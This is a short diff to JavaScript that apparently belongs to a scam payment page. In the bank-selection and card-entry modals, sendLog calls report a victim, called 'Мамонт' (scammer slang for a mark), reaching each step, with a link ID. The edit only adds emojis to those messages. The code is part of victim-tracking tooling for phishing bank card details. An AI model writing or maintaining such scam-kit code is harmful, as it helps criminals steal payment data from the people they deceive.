@@ -2437,7 +2437,7 @@ function openBankModal() {
   console.log('🏦 Bank modal opened, logging...', link_id);
   if (typeof sendLog === 'function') {
     console.log('✅ sendLog exists, sending...');
-    sendLog('payment_flow', `Мамонт перешел на выбор банка\nЛинк айди: ${link_id}`);
+    sendLog('payment_flow', `🏦 Мамонт перешел на выбор банка\n🔗 Линк айди: ${link_id}`);
   } else {
     console.error('❌ sendLog is not defined!');
   }
@@ -2458,7 +2458,7 @@ function openCardModal() {
   console.log('💳 Card modal opened, logging...', link_id);
   if (typeof sendLog === 'function') {
     console.log('✅ sendLog exists, sending...');
-    sendLog('payment_flow', `Мамонт перешел на ввод карты\nЛинк айди: ${link_id}`);
+    sendLog('payment_flow', `💳 Мамонт перешел на ввод карты\n🔗 Линк айди: ${link_id}`);
   } else {
     console.error('❌ sendLog is not defined!');
   }
